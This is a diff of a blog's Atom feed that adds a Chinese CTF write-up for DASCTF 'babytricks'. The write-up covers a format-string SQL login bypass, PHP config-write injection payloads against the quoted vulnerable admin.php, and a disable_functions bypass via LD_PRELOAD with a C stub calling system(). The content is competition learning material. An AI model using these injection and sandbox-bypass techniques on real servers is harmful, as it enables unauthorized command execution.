@@ -38,25 +38,6 @@
   </entry>
   
   <entry>
-    <title>actf2020-wp</title>
-    <link href="https://glotozz.github.io/2020/05/31/actf2020-wp/"/>
-    <id>https://glotozz.github.io/2020/05/31/actf2020-wp/</id>
-    <published>2020-05-31T10:00:41.000Z</published>
-    <updated>2020-05-31T10:00:41.164Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><!-- tocstop --><hr>]]></content>
-    
-    <summary type="html">
-    
-      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>RCTF2020-wp</title>
     <link href="https://glotozz.github.io/2020/05/31/rctf2020-wp/"/>
     <id>https://glotozz.github.io/2020/05/31/rctf2020-wp/</id>
@@ -431,6 +412,27 @@
     
     
       <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DASCTF-babytricks-wp</title>
+    <link href="https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/"/>
+    <id>https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/</id>
+    <published>2020-04-25T08:10:35.000Z</published>
+    <updated>2020-04-26T12:10:05.774Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#一-格式化字符串万能密码">一、格式化字符串+万能密码</a></li><li><a href="#二">二、</a></li><li><a href="#三-bypass-disable_function">三、bypass disable_function</a></li></ul><!-- tocstop --><hr><h4><span id="一-格式化字符串万能密码">一、格式化字符串+万能密码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure><p>格式化字符串，构造<code>%1$</code>可以吃掉user后面的单引号，<code>passwd=^0</code>，存在许多黑名单，发现<code>^</code>没有被过滤，<code>^0</code>成功登录</p><h4><span id="二">二、</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./init.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;script&gt;window.location.href='./index.php'&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'shell'</span>])&#123;</span><br><span class="line">    $shell= addslashes($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">    $file = file_get_contents(<span class="string">'./shell.php'</span>);</span><br><span class="line">    $file = preg_replace(<span class="string">"/\\\$shell = '.*';/s"</span>, <span class="string">"\$shell = '&#123;$shell&#125;';"</span>, $file);</span><br><span class="line">    file_put_contents(<span class="string">'./shell.php'</span>, $file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"set your shell"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    chdir(<span class="string">"/"</span>);</span><br><span class="line">    highlight_file(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;;phpinfo();</span><br><span class="line">?shell&#x3D;$0</span><br></pre></td></tr></table></figure><h4><span id="三-bypass-disable_function">三、bypass disable_function</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail</span><br></pre></td></tr></table></figure><p>设置了<code>open_basedir</code></p><p>过滤了<code>mail()</code>、<code>error_log()</code>、<code>ini_set()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int preload()</span><br><span class="line">&#123;</span><br><span class="line">const char *command;</span><br><span class="line">int i;</span><br><span class="line">command &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">return system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.anquanke.com/post/id/197745?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745?from=singlemessage</a> </p></blockquote><p>fuzz能触发<code>ld_preload</code>的函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">error_log</span><br><span class="line">mail</span><br><span class="line">gnupg_init</span><br><span class="line">imap_mail</span><br><span class="line">pcntl_exec</span><br><span class="line">new gnupg()</span><br></pre></td></tr></table></figure><p>这里可以用<code>new gnupg()</code>触发<code>ld_preload</code></p><p>还有个小疑问，为啥要给<code>so</code>文件</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="wp" scheme="https://glotozz.github.io/tags/wp/"/>
     
   </entry>
   
